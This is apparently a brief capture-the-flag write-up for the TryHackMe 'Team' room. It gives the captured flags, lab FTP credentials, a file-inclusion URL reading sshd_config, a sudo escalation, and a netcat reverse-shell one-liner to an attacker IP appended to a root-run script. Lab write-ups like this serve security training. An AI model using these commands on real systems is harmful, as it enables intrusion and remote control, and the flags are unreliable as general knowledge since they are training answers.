# TryHackMe Team

> Saikat Karmakar | Mar 6:2021

-------------------------------------------------------------------------------

# Task 2

1. user flag
```
THM{6Y0TXHz7c2d}
```
2. root flag
```
THM{fhqbznavfonq}
```

--
-----------
***Notes***
-----------
http://team.thm:80/scripts/script.txt

ftp creds
```
user = ftpuser
pass = T3@m$h@r3
```
ssh-info path 
http://dev.team.thm/script.php?page=/etc/ssh/sshd_config


change the user to gyles.
``
sudo -u gyles /home/gyles/admin_checks
``
by running it & give input `/bin/bash`
put linpeas & find a file ran by root 

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.23.120 1234 >/tmp/f" >> /usr/local/bin/main_backup.sh